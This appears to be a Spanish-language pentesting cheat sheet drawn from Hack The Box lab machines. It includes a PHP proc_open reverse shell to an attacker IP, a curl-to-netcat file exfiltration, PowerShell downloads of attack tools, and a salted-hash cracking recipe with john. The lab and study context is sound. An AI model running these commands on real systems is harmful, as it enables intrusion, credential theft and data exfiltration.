- En go
```go
go build -ldflags "-s -w" .

upx kerbrute //O el binario que quieras
```


- En pip
```bash
pip install --break-system-packages -r requirements.txt


python3 -m venv fs

source fs/bin/activate

deactivate
```


- Descargar .git
```bash
python3 /opt/git-dumper/git_dumper.py http://10.10.11.58/.git/ dump
```


- Tar
```bash
#COMPRIMIR
tar -czf /tmp/gnupg.tar.gz ./.gnupg

#Descomprimir
tar -xzf gnupg.tar.gz
```


- Transferir arcahivos por SMB

```bash
impacket-smbserver share $(pwd) -smb2support -username kali -password kali


net use \\10.10.14.10\share /u:kali kali
cp "archivo" //10.10.14.10/share/archivo

#Si quiero subir a la maquina
copy \\10.10.14.10\share\PetitPotato.exe PetitPotato.exe
```

## PHPINFO Bypass

- Descargamos
```bash
python2 /opt/dffnc.. --file phpinfo.php
```

- proc_open
```php
<?php

$cmd = 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1';
$process = proc_open("/bin/bash -c '$cmd'", [
    0 => ['pipe', 'r'],
    1 => ['pipe', 'w'],
    2 => ['pipe', 'w']
], $pipes);

fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);

proc_close($process);
?>
```

## Completar hash

- Saco un hash de mysql
```sql
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03
```

- Le añades usuario, salt y dynamic
```sql
f.frizzle:$dynamic_82$067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03$/aACFhikmNopqrRTVz2489
```

- Romper
```bash
john --format=dynamic='sha256($s.$p)' --wordlist=/usr/share/wordlists/rockyou.txt hash
```

# Transferir con CURl

```powershell
curl --data-binary '.\$IE2XMEG.7z' http://10.10.14.14:4444
```

- EN kali
```bash
nc -lvnp 4444 > archivo
```

# Descargar en powershell

```bash
Invoke-WebRequest -Uri "http://10.10.14.109:8000/SharpGPOAb use.exe" -OutFile "C:\Temp\SharpGPOAbuse.exe"
```

```bash
powershell -c wget 10.10.14.6/RunasCs.exe -outfile r.exe
```
## Descargar desde ssh

```bash
scp -o GSSAPIAuthentication=yes -o GSSAPIKeyExchange=yes f.frizzle@frizzdc.frizz.htb:C:/Users/f.frizzle/Desktop/wapt-backup-sunday.7z .
```

- O
```bash
scp -P 2222 -i id_rsa svc_backup@voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/* .
```

## AMD64.DEB

```bash
dpkg -i nats-0.2.4-amd64.deb

#error de dependencias
sudo apt-get install -f
```
